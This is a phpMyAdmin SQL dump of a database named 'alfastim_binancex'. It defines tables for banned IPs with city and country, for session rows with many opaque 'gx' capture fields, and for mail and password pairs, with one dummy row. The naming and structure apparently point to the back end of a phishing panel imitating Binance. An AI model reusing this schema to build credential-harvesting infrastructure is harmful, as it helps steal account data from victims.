-- phpMyAdmin SQL Dump
-- version 4.9.7
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: Aug 12, 2022 at 05:35 AM
-- Server version: 10.3.35-MariaDB-log-cll-lve
-- PHP Version: 7.4.30

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `alfastim_binancex`
--

-- --------------------------------------------------------

--
-- Table structure for table `ban`
--

CREATE TABLE `ban` (
  `id` int(11) NOT NULL,
  `ip` text NOT NULL,
  `sehir` text NOT NULL,
  `ulke` text NOT NULL,
  `durum` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `gtm`
--

CREATE TABLE `gtm` (
  `id` int(11) NOT NULL,
  `ses` int(11) NOT NULL,
  `ip` varchar(255) NOT NULL,
  `notif` int(11) NOT NULL,
  `gx1` text NOT NULL,
  `tarih` mediumtext NOT NULL,
  `gx2` text NOT NULL,
  `gx3` text NOT NULL,
  `gx4` text NOT NULL,
  `gx5` text NOT NULL,
  `gx6` text NOT NULL,
  `gx7` text NOT NULL,
  `gx8` text NOT NULL,
  `gx9` text NOT NULL,
  `gx10` text NOT NULL,
  `gx11` text NOT NULL,
  `gx12` text NOT NULL,
  `gx13` text NOT NULL,
  `gx14` text NOT NULL,
  `gx15` text NOT NULL,
  `durum` mediumtext NOT NULL,
  `durum2` mediumtext NOT NULL,
  `gx22` text NOT NULL,
  `gx21` text NOT NULL,
  `gx20` text NOT NULL,
  `gx19` text NOT NULL,
  `gx18` text NOT NULL,
  `ww` text NOT NULL,
  `ping` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `icq`
--

CREATE TABLE `icq` (
  `id` int(11) NOT NULL,
  `mail` text NOT NULL,
  `password` text NOT NULL,
  `ip` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `icq`
--

INSERT INTO `icq` (`id`, `mail`, `password`, `ip`) VALUES
(1, 'w', 'd', 'http://google.com');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `ban`
--
ALTER TABLE `ban`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `gtm`
--
ALTER TABLE `gtm`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `id` (`id`);

--
-- Indexes for table `icq`
--
ALTER TABLE `icq`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `ban`
--
ALTER TABLE `ban`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `gtm`
--
ALTER TABLE `gtm`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `icq`
--
ALTER TABLE `icq`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
